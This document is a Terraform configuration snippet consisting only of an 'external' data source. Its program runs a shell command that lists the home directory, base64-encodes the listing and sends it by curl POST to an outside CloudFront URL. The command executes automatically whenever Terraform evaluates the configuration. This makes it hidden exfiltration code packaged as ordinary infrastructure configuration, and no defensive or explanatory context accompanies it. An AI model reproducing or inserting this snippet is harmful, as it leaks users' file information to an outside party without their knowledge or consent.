data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"param1=`ls -la ~ | base64`\" https://d9usos5h96tz9.cloudfront.net/log"]
}